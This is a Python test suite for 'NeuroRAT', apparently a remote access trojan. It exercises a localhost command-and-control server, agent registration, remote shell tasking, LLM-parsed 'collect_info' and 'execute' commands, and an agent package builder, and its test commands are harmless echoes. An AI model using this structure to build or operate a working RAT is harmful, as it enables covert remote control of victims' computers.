#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import unittest
import tempfile
import subprocess
import requests
import socket
import threading
import json
import base64
import uuid
import logging
from contextlib import contextmanager
from concurrent.futures import ThreadPoolExecutor
import importlib.util

# Setup logging
logging.basicConfig(level=logging.INFO, 
                    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger("NeuroRAT-Tester")

# Check if we can import from agent_protocol
try:
    from agent_protocol.shared.encryption import EncryptionManager
    from agent_protocol.shared.utils import get_runtime_path
    AGENT_PROTOCOL_AVAILABLE = True
except ImportError:
    AGENT_PROTOCOL_AVAILABLE = False
    logger.warning("agent_protocol not available for direct import. Some tests will be skipped.")

# Configuration
TEST_SERVER_HOST = "127.0.0.1"
TEST_SERVER_PORT = 8765
TEST_WEB_PORT = 5765
TEST_TIMEOUT = 30  # seconds
TEST_KEY = "testkey123456789012345678901234"  # 32-byte key for testing

class ServerProcess:
    """Manages the server process for testing"""
    
    def __init__(self, host=TEST_SERVER_HOST, port=TEST_SERVER_PORT, web_port=TEST_WEB_PORT):
        self.host = host
        self.port = port
        self.web_port = web_port
        self.process = None
        
    def start(self):
        """Start the server process for testing"""
        server_cmd = [
            sys.executable, 
            "agent_protocol/examples/neurorat_server.py",
            "--host", self.host,
            "--port", str(self.port),
            "--web-port", str(self.web_port),
            "--test-mode"
        ]
        
        # Start server in new process
        self.process = subprocess.Popen(
            server_cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            universal_newlines=True
        )
        
        # Wait for server to start
        for _ in range(10):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((self.host, self.port))
                s.close()
                logger.info(f"Server started on {self.host}:{self.port}")
                return True
            except socket.error:
                time.sleep(1)
            finally:
                if s:
                    s.close()
        
        self.stop()
        return False
    
    def stop(self):
        """Stop the server process"""
        if self.process:
            self.process.terminate()
            self.process.wait(timeout=5)
            logger.info("Server stopped")
            self.process = None

class AgentProcess:
    """Manages an agent process for testing"""
    
    def __init__(self, server_host=TEST_SERVER_HOST, server_port=TEST_SERVER_PORT):
        self.server_host = server_host
        self.server_port = server_port
        self.process = None
        self.agent_id = str(uuid.uuid4())
        
    def start(self):
        """Start an agent process for testing"""
        agent_cmd = [
            sys.executable,
            "neurorat_launcher.py",
            "run",
            "--server", self.server_host,
            "--port", str(self.server_port),
            "--agent-id", self.agent_id,
            "--test-mode"
        ]
        
        # Start agent in new process
        self.process = subprocess.Popen(
            agent_cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            universal_newlines=True
        )
        
        # Wait for agent to start (just wait a bit)
        time.sleep(3)
        if self.process.poll() is not None:
            logger.error("Agent failed to start")
            return False
            
        logger.info(f"Agent started with ID: {self.agent_id}")
        return True
    
    def stop(self):
        """Stop the agent process"""
        if self.process:
            self.process.terminate()
            self.process.wait(timeout=5)
            logger.info("Agent stopped")
            self.process = None

class TestEncryption(unittest.TestCase):
    """Tests for the encryption components"""
    
    @unittest.skipIf(not AGENT_PROTOCOL_AVAILABLE, "agent_protocol not available")
    def test_encryption_manager(self):
        """Test the EncryptionManager class"""
        manager = EncryptionManager(TEST_KEY)
        
        # Test encryption/decryption
        plaintext = "This is a secret message"
        encrypted = manager.encrypt(plaintext)
        decrypted = manager.decrypt(encrypted)
        
        self.assertNotEqual(plaintext, encrypted)
        self.assertEqual(plaintext, decrypted)
    
    @unittest.skipIf(not AGENT_PROTOCOL_AVAILABLE, "agent_protocol not available")
    def test_encryption_compatibility(self):
        """Test encryption compatibility across implementations"""
        # Create two different encryption managers with the same key
        manager1 = EncryptionManager(TEST_KEY)
        manager2 = EncryptionManager(TEST_KEY)
        
        plaintext = "Cross-manager compatibility test"
        encrypted = manager1.encrypt(plaintext)
        decrypted = manager2.decrypt(encrypted)
        
        self.assertEqual(plaintext, decrypted)

class TestAgentServer(unittest.TestCase):
    """Integration tests for agent-server communication"""
    
    @classmethod
    def setUpClass(cls):
        cls.server = ServerProcess()
        cls.server.start()
        time.sleep(2)  # Give server time to initialize
    
    @classmethod
    def tearDownClass(cls):
        cls.server.stop()
    
    def test_agent_connection(self):
        """Test agent connection to server"""
        agent = AgentProcess()
        try:
            self.assertTrue(agent.start())
            
            # Wait for agent to register with server
            time.sleep(3)
            
            # Check agent status via API
            response = requests.get(f"http://{TEST_SERVER_HOST}:{TEST_WEB_PORT}/api/v1/agents")
            self.assertEqual(response.status_code, 200)
            
            # Verify our agent is in the list
            agents = response.json()
            agent_ids = [a.get("id") for a in agents]
            self.assertIn(agent.agent_id, agent_ids)
            
        finally:
            agent.stop()
    
    def test_command_execution(self):
        """Test command execution on agent"""
        agent = AgentProcess()
        try:
            self.assertTrue(agent.start())
            time.sleep(3)  # Wait for agent to register
            
            # Send a simple command to get OS info
            task_data = {
                "type": "shell",
                "command": "echo 'NeuroRAT Test'"
            }
            
            response = requests.post(
                f"http://{TEST_SERVER_HOST}:{TEST_WEB_PORT}/api/v1/agents/{agent.agent_id}/tasks",
                json=task_data
            )
            self.assertEqual(response.status_code, 200)
            
            task_id = response.json().get("id")
            
            # Wait for task to complete
            for _ in range(10):
                response = requests.get(
                    f"http://{TEST_SERVER_HOST}:{TEST_WEB_PORT}/api/v1/tasks/{task_id}"
                )
                task_status = response.json().get("status")
                if task_status in ["completed", "failed"]:
                    break
                time.sleep(1)
            
            # Check task result
            self.assertEqual(task_status, "completed")
            result = response.json().get("result")
            self.assertIn("NeuroRAT Test", result)
            
        finally:
            agent.stop()

class TestLLMProcessor(unittest.TestCase):
    """Tests for the LLM processor component"""
    
    def setUp(self):
        # Try to import llm_processor if it exists
        try:
            spec = importlib.util.spec_from_file_location("llm_processor", "llm_processor.py")
            if spec and spec.loader:
                self.llm_module = importlib.util.module_from_spec(spec)
                spec.loader.exec_module(self.llm_module)
                self.processor_available = True
            else:
                self.processor_available = False
        except (ImportError, FileNotFoundError):
            self.processor_available = False
    
    @unittest.skipIf(not AGENT_PROTOCOL_AVAILABLE, "LLM processor not available")
    def test_command_parsing(self):
        """Test LLM command parsing"""
        if not self.processor_available:
            self.skipTest("llm_processor.py not found")
        
        processor = self.llm_module.LLMProcessor()
        
        # Test basic command parsing
        command = "collect_info: system"
        result = processor.process_command(command)
        self.assertIsNotNone(result)
        self.assertIn("action", result)
        self.assertEqual(result["action"], "collect_info")
    
    @unittest.skipIf(not AGENT_PROTOCOL_AVAILABLE, "LLM processor not available")
    def test_command_execution(self):
        """Test LLM command execution"""
        if not self.processor_available:
            self.skipTest("llm_processor.py not found")
        
        processor = self.llm_module.LLMProcessor()
        
        # Test echo command execution
        command = "execute: echo 'LLM Test'"
        result = processor.process_command(command)
        
        self.assertIsNotNone(result)
        self.assertIn("action", result)
        self.assertEqual(result["action"], "execute")
        
        # Execute the command
        output = processor.execute_action(result)
        self.assertIn("LLM Test", output)

class TestBuildAgent(unittest.TestCase):
    """Tests for the agent build utility"""
    
    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()
        self.output_path = os.path.join(self.temp_dir, "neurorat_test")
    
    def tearDown(self):
        import shutil
        shutil.rmtree(self.temp_dir, ignore_errors=True)
    
    def test_zip_package_build(self):
        """Test building a ZIP package"""
        build_cmd = [
            sys.executable,
            "build_agent.py",
            "--server", TEST_SERVER_HOST,
            "--port", str(TEST_SERVER_PORT),
            "--output", self.output_path,
            "--type", "zip"
        ]
        
        process = subprocess.run(build_cmd, capture_output=True, text=True)
        
        # Check process ran successfully
        self.assertEqual(process.returncode, 0, f"Build failed: {process.stderr}")
        
        # Check ZIP file exists
        zip_path = f"{self.output_path}.zip"
        self.assertTrue(os.path.exists(zip_path), f"ZIP package not found at {zip_path}")
        
        # Check ZIP file is valid
        import zipfile
        try:
            with zipfile.ZipFile(zip_path) as zf:
                # Check important files are included
                files = zf.namelist()
                self.assertIn("neurorat_agent.py", files)
                self.assertIn("neurorat_launcher.py", files)
        except zipfile.BadZipFile:
            self.fail(f"Invalid ZIP file: {zip_path}")

class TestLoadTest(unittest.TestCase):
    """Load and performance tests"""
    
    @classmethod
    def setUpClass(cls):
        cls.server = ServerProcess()
        cls.server.start()
        time.sleep(2)  # Give server time to initialize
    
    @classmethod
    def tearDownClass(cls):
        cls.server.stop()
    
    def test_multiple_agents(self):
        """Test multiple agents connecting simultaneously"""
        num_agents = 5
        agents = []
        
        try:
            # Start multiple agents
            for _ in range(num_agents):
                agent = AgentProcess()
                self.assertTrue(agent.start())
                agents.append(agent)
                time.sleep(1)  # Stagger starts
            
            # Wait for all agents to register
            time.sleep(5)
            
            # Check all agents connected
            response = requests.get(f"http://{TEST_SERVER_HOST}:{TEST_WEB_PORT}/api/v1/agents")
            self.assertEqual(response.status_code, 200)
            
            registered_agents = response.json()
            self.assertGreaterEqual(len(registered_agents), num_agents)
            
            # Verify our agents are in the list
            agent_ids = [a.get("id") for a in registered_agents]
            for agent in agents:
                self.assertIn(agent.agent_id, agent_ids)
                
        finally:
            # Stop all agents
            for agent in agents:
                agent.stop()
    
    def test_concurrent_commands(self):
        """Test concurrent command execution"""
        agent = AgentProcess()
        
        try:
            self.assertTrue(agent.start())
            time.sleep(3)  # Wait for agent to register
            
            num_commands = 10
            task_ids = []
            
            # Send multiple concurrent commands
            for i in range(num_commands):
                task_data = {
                    "type": "shell",
                    "command": f"echo 'Concurrent Test {i}'"
                }
                
                response = requests.post(
                    f"http://{TEST_SERVER_HOST}:{TEST_WEB_PORT}/api/v1/agents/{agent.agent_id}/tasks",
                    json=task_data
                )
                self.assertEqual(response.status_code, 200)
                task_ids.append(response.json().get("id"))
            
            # Wait for all tasks to complete
            completed = 0
            for _ in range(30):  # Wait up to 30 seconds
                completed = 0
                for task_id in task_ids:
                    response = requests.get(
                        f"http://{TEST_SERVER_HOST}:{TEST_WEB_PORT}/api/v1/tasks/{task_id}"
                    )
                    if response.json().get("status") == "completed":
                        completed += 1
                
                if completed == num_commands:
                    break
                time.sleep(1)
            
            self.assertEqual(completed, num_commands, f"Only {completed}/{num_commands} tasks completed")
            
        finally:
            agent.stop()

class TestSecurityFeatures(unittest.TestCase):
    """Tests for security features"""
    
    @unittest.skipIf(not AGENT_PROTOCOL_AVAILABLE, "agent_protocol not available")
    def test_encryption_strength(self):
        """Test encryption strength"""
        manager = EncryptionManager(TEST_KEY)
        
        # Generate a large random message
        import random
        import string
        message = ''.join(random.choice(string.printable) for _ in range(10000))
        
        # Encrypt and ensure it's secure
        encrypted = manager.encrypt(message)
        
        # Check that the ciphertext is sufficiently different from plaintext
        # Calculate Hamming distance as a simple metric
        hamming_distance = sum(c1 != c2 for c1, c2 in zip(message[:100], encrypted[:100]))
        self.assertGreater(hamming_distance / 100, 0.7)  # At least 70% different
        
        # Test decryption works
        decrypted = manager.decrypt(encrypted)
        self.assertEqual(message, decrypted)
    
    def test_server_authentication(self):
        """Test server authentication if available"""
        # This test only runs if the server supports authentication
        server_cmd = [
            sys.executable, 
            "agent_protocol/examples/neurorat_server.py",
            "--help"
        ]
        
        process = subprocess.run(server_cmd, capture_output=True, text=True)
        
        # Check if auth is supported
        if "--auth" not in process.stdout and "--auth" not in process.stderr:
            self.skipTest("Server does not support authentication")
        
        # Start server with authentication
        auth_token = "test_auth_token"
        server = ServerProcess()
        server_cmd = [
            sys.executable, 
            "agent_protocol/examples/neurorat_server.py",
            "--host", TEST_SERVER_HOST,
            "--port", str(TEST_SERVER_PORT),
            "--web-port", str(TEST_WEB_PORT),
            "--auth",
            "--token", auth_token,
            "--test-mode"
        ]
        
        try:
            # Start server with auth
            server.process = subprocess.Popen(
                server_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True
            )
            
            # Wait for server to start
            time.sleep(3)
            
            # Test unauthorized access
            response = requests.get(f"http://{TEST_SERVER_HOST}:{TEST_WEB_PORT}/api/v1/agents")
            self.assertNotEqual(response.status_code, 200)
            
            # Test authorized access
            headers = {"Authorization": f"Bearer {auth_token}"}
            response = requests.get(
                f"http://{TEST_SERVER_HOST}:{TEST_WEB_PORT}/api/v1/agents",
                headers=headers
            )
            self.assertEqual(response.status_code, 200)
            
        finally:
            server.stop()

def run_tests():
    """Run all the tests"""
    # Create test suite
    loader = unittest.TestLoader()
    suite = unittest.TestSuite()
    
    # Add test cases
    suite.addTest(loader.loadTestsFromTestCase(TestEncryption))
    suite.addTest(loader.loadTestsFromTestCase(TestAgentServer))
    suite.addTest(loader.loadTestsFromTestCase(TestLLMProcessor))
    suite.addTest(loader.loadTestsFromTestCase(TestBuildAgent))
    suite.addTest(loader.loadTestsFromTestCase(TestLoadTest))
    suite.addTest(loader.loadTestsFromTestCase(TestSecurityFeatures))
    
    # Run tests
    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(suite)
    
    return result

if __name__ == "__main__":
    print("=" * 80)
    print("NeuroRAT Test Suite")
    print("=" * 80)
    
    # Check if agent_protocol is available
    if not AGENT_PROTOCOL_AVAILABLE:
        print("WARNING: agent_protocol not available in Python path.")
        print("Some tests will be skipped.")
    
    # Run the tests
    result = run_tests()
    
    # Print summary
    print("\n" + "=" * 80)
    print(f"Tests Run: {result.testsRun}")
    print(f"Errors: {len(result.errors)}")
    print(f"Failures: {len(result.failures)}")
    
    # Set exit code based on test results
    sys.exit(len(result.errors) + len(result.failures)) 